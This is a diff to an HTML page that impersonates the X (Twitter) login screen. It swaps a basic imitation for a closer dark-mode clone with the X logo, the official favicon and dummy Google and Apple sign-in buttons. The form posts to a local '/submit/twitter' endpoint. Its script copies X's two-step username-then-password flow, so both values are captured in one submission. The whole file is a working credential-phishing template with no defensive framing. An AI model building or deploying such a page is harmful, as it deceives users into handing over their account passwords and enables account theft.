@@ -1,60 +1,321 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Log in to X</title>
-<style>
-body { font-family: Helvetica, Arial, sans-serif; background: #ffffff; margin: 0; }
-.container {
-  max-width: 400px;
-  margin: 50px auto;
-  padding: 20px;
-  background: #fff;
-  border-radius: 16px;
-  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-  text-align: center;
-}
-.logo { margin-bottom: 20px; }
-.logo svg { width: 50px; height: 50px; }
-h2 { font-weight: normal; margin-bottom: 20px; font-size: 24px; }
-input[type="text"], input[type="password"], input[type="email"] {
-  width: 90%; max-width: 350px; padding: 12px; margin: 10px auto; display: block;
-  border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box;
-}
-button {
-  width: 90%; max-width: 350px; padding: 12px; margin: 10px auto; display: block;
-  background: #1da1f2; color: white; border: none; border-radius: 9999px;
-  font-size: 16px; font-weight: bold; cursor: pointer; box-sizing: border-box;
-}
-button:hover { background: #0d8ddb; }
-a { display: block; margin-top: 15px; color: #1da1f2; text-decoration: none; font-size: 14px; }
-a:hover { text-decoration: underline; }
-.footer { margin-top: 20px; font-size: 12px; color: #777; }
-.footer { margin-top: 20px; font-size: 12px; color: #777; text-align: center; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to X</title>
+    <link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #000;
+            color: #e7e9ea;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 364px;
+            background: #000;
+            padding: 20px;
+        }
+        
+        .x-logo {
+            width: 30px;
+            height: 30px;
+            margin: 0 auto 32px;
+            display: block;
+            fill: #e7e9ea;
+        }
+        
+        .title {
+            font-size: 31px;
+            font-weight: 700;
+            color: #e7e9ea;
+            margin-bottom: 36px;
+            text-align: left;
+        }
+        
+        .social-buttons {
+            margin-bottom: 20px;
+        }
+        
+        .social-btn {
+            width: 100%;
+            padding: 8px 24px;
+            border: 1px solid #536471;
+            border-radius: 20px;
+            background: #000;
+            color: #e7e9ea;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: background-color 0.2s;
+            text-decoration: none;
+        }
+        
+        .social-btn:hover {
+            background: #181818;
+        }
+        
+        .google-icon {
+            width: 18px;
+            height: 18px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTgiIHZpZXdCb3g9IjAgMCAxOCAxOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE3LjY0IDkuMjA0NTVDMTcuNjQgOC41NjU5MSAxNy41ODI3IDcuOTUyMjcgMTcuNDc3MyA3LjM2MzY0SDlWMTAuODQ1NUgxMy44NDRDMTMuNjM1IDExLjk3IDEzLjAwMDkgMTIuOTIzNiAxMi4wNDc3IDEzLjU2MzZWMTUuODE5MUgxNC45NTY4QzE2LjY1ODcgMTQuMjUyMyAxNy42NCA2LjE0NTQ1IDE3LjY0IDkuMjA0NTVaIiBmaWxsPSIjNDI4NUY0Ii8+CjxwYXRoIGQ9Ik05IDEyQzEwLjY1IDEyIDEyLjAzNzUgMTEuNDYyNSAxMi4wNDc3IDEzLjU2MzZINy4wOTU0NUMxNi4yNDEyIDEzLjM5NjIgOC4xODEyIDEzLjcyNSA5IDEzLjcyNUM2Ljc5NjIgMTMuNzI1IDUuMDEzNyAxMi41MzEyIDQuMzY0NSAxMC44MTc1SDAuMDg3NVYxMy42OThDMi42MTYyIDE2Ljc3NSA1LjYwMzcgMTUuNSA5IDE1LjVaIiBmaWxsPSIjMzRBODUzIi8+CjxwYXRoIGQ9Ik00LjM2NDUgMTAuODE3NUM0LjA1NSA5Ljk5MzggMy44NzUgOS4xMDYyIDMuODc1IDguMTg3NUM0Ljg3NSA3LjI2ODggNC4wNTUgNi4zODEyIDQuMzY0NSA1LjU1NzVWMi42NzYyNUgwLjA4NzVDLTIuMjIyNSA1LjY4MTIgLTEuNzUgNy45MjUgLTEuNzUgMTAuMjVDLTEuNzUgMTIuNTc1IC0xLjIyMjUgMTQuODE4OCAwLjA4NzUgMTYuODIzOEw0LjM2NDUgMTMuOTQyNUM0LjA1NSAxMy4xMTg4IDMuODc1IDEyLjIzMTIgMy44NzUgMTEuMzEyNUM0Ljg3NSAxMC4zOTM4IDQuMDU1IDkuNTA2MiA0LjM2NDUgOC42ODI1TDQuMzY0NSAxMC44MTc1WiIgZmlsbD0iI0ZCQkMwNSIvPgo8cGF0aCBkPSJNOSAyLjc1QzEwLjYzMTIgMi43NSAxMi4xMDYyIDMuMzU2MiAxMy4yNDYyIDQuNDMxMkwxNi4yNSAxLjY2ODc1QzE0LjE1IC0wLjI1IDExLjMwNjIgLTEuNCA5IC0xLjRDNS42MDM3IC0xLjQgMi42MTYyIDAuNjI1IDAuMDg3NSAyLjY3NjI1TDQuMzY0NSA1LjU1NzVDNS4wMTM3IDMuODQzOCA2Ljc5NjIgMi42NSA5IDIuNjVWMi43NVoiIGZpbGw9IiNFQTQzMzUiLz4KPC9zdmc+');
+            background-size: contain;
+        }
+        
+        .apple-icon {
+            width: 18px;
+            height: 18px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTgiIHZpZXdCb3g9IjAgMCAxOCAxOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEyLjc2IDEuNzYzQzEzLjQ3NSAwLjk0IDE0LjA5IDAgMTQuMDkgMEMxMy43MDUgMS4wNDcgMTIuODc1IDEuOCAxMi4yNDUgMi41NjVDMTEuNjM1IDMuMzEgMTEuMjUgNC4yMTUgMTEuMjUgNC4yMTVDMTEuNjM1IDQuMjE1IDEyLjA0NSAzLjMxIDEyLjc2IDEuNzYzWk0xNS41IDUuMjVDMTQuNzg1IDUuMjUgMTQuMjUgNS4yNSAxMy45MjUgNS40NzVDMTMuNzEgNS42MjUgMTMuNDk1IDUuNzc1IDEzLjE3IDUuNzc1QzEyLjU2IDUuNzc1IDEyIDUuNTUgMTEuNzQgNS40QzExLjQ4IDUuMjUgMTEuMTU1IDUuMjUgMTAuNSA1LjI1QzguOTg1IDUuMjUgNy44IDYuMTcgNy4xNiA3LjQzNUM1Ljg4IDkuNjMgNi44OSAxMy42NCA5LjQ5NSAxNS44NDVDMTAuMjYgMTYuNzQ1IDEwLjgwNSAxNy41NSAxMS41IDE4SDEzLjUxQzE0LjI5NSAxNy41NSAxNC44NzUgMTYuNzQ1IDE1LjY0NSAxNS44NDVDMTcuNTUgMTMuOTE1IDE4IDEwLjQ0IDE1LjUgNS4yNVoiIGZpbGw9IiNlN2U5ZWEiLz4KPC9zdmc+');
+            background-size: contain;
+        }
+        
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #2f3336;
+        }
+        
+        .divider span {
+            background: #000;
+            padding: 0 16px;
+            color: #e7e9ea;
+            font-size: 15px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 17px;
+            border: 1px solid #333639;
+            border-radius: 4px;
+            background: #000;
+            color: #e7e9ea;
+            transition: border-color 0.2s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #1d9bf0;
+        }
+        
+        .input-field::placeholder {
+            color: #71767b;
+        }
+        
+        .next-btn {
+            width: 100%;
+            background: #e7e9ea;
+            color: #0f1419;
+            border: none;
+            border-radius: 20px;
+            font-size: 15px;
+            font-weight: 700;
+            padding: 12px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+        
+        .next-btn:hover {
+            background: #d7dbdf;
+        }
+        
+        .forgot-btn {
+            width: 100%;
+            background: transparent;
+            color: #e7e9ea;
+            border: 1px solid #536471;
+            border-radius: 20px;
+            font-size: 15px;
+            font-weight: 700;
+            padding: 12px;
+            cursor: pointer;
+            margin-bottom: 60px;
+            transition: background-color 0.2s;
+        }
+        
+        .forgot-btn:hover {
+            background: #181818;
+        }
+        
+        .signup-text {
+            font-size: 15px;
+            color: #71767b;
+            text-align: left;
+        }
+        
+        .signup-text a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+        
+        .signup-text a:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+            
+            .container {
+                max-width: 100%;
+                padding: 20px 16px;
+            }
+            
+            .x-logo {
+                width: 24px;
+                height: 24px;
+                margin-bottom: 24px;
+            }
+            
+            .title {
+                font-size: 24px;
+                margin-bottom: 24px;
+            }
+            
+            .social-btn {
+                font-size: 16px;
+                padding: 12px 24px;
+                margin-bottom: 8px;
+            }
+            
+            .input-field {
+                font-size: 16px; /* Prevent zoom on iOS */
+                padding: 16px;
+            }
+            
+            .next-btn, .forgot-btn {
+                font-size: 16px;
+                padding: 14px;
+            }
+            
+            .forgot-btn {
+                margin-bottom: 40px;
+            }
+            
+            .signup-text {
+                font-size: 14px;
+                text-align: center;
+            }
+        }
+        
+        @media (max-width: 320px) {
+            .container {
+                padding: 16px 12px;
+            }
+            
+            .title {
+                font-size: 20px;
+            }
+            
+            .social-btn {
+                font-size: 14px;
+                padding: 10px 20px;
+            }
+            
+            .google-icon,
+            .apple-icon {
+                width: 16px;
+                height: 16px;
+            }
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-  <div class="logo">
-    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-      <path fill="#1da1f2" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
-    </svg>
-  </div>
-  <h2>Sign in to X</h2>
-  <form method="POST" action="/submit/twitter">
-    <input type="email" name="email" placeholder="Phone, email, or username" required autofocus autocomplete="username" />
-    <input type="password" name="pass" placeholder="Password" required autocomplete="current-password" />
-    <button type="submit">Log In</button>
-  </form>
-  <a href="#">Forgot password?</a>
-  <a href="#">Sign up</a>
-  <div style="background:#f7f7f7; padding:10px; font-size:12px; text-align:center; color:#555; margin-top:15px;">
-    By continuing, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>. This site uses cookies to improve your experience.
-  </div>
-</div>
-<div class="footer">
-  X Corp. © 2025
-</div>
+    <div class="container">
+        <svg viewBox="0 0 24 24" class="x-logo">
+            <g>
+                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+            </g>
+        </svg>
+        
+        <h1 class="title" style="text-align: center;">Sign in to X</h1>
+        
+        <div class="social-buttons">
+            <a href="#" class="social-btn">
+                <div class="google-icon"></div>
+                Continue with Google
+            </a>
+            <a href="#" class="social-btn">
+                <div class="apple-icon"></div>
+                Continue with Apple
+            </a>
+        </div>
+        
+        <div class="divider">
+            <span>or</span>
+        </div>
+        
+        <form action="/submit/twitter" method="post">
+            <div class="form-group">
+                <input type="text" id="username-input" name="username" class="input-field" placeholder="Phone, email, or username" required>
+                <input type="hidden" id="username-hidden" name="username">
+            </div>
+            
+            <button type="submit" class="next-btn">Next</button>
+        </form>
+        
+        <button class="forgot-btn">Forgot password?</button>
+        
+        <p class="signup-text">
+            Don't have an account? <a href="#">Sign up</a>
+        </p>
+    </div>
+    
+    <script>
+        // Simulate X's behavior of asking for password on second step
+        let isPasswordStep = false;
+        const form = document.querySelector('form');
+        const usernameField = document.querySelector('input[name="username"]');
+        const nextBtn = document.querySelector('.next-btn');
+        
+        form.addEventListener('submit', function(e) {
+            if (!isPasswordStep) {
+                e.preventDefault();
+                // Transform to password step
+                document.getElementById('username-hidden').value = document.getElementById('username-input').value;
+                usernameField.type = 'password';
+                usernameField.name = 'password';
+                usernameField.placeholder = 'Password';
+                usernameField.value = '';
+                usernameField.focus();
+                nextBtn.textContent = 'Log in';
+                isPasswordStep = true;
+            }
+        });
+    </script>
 </body>
 </html>
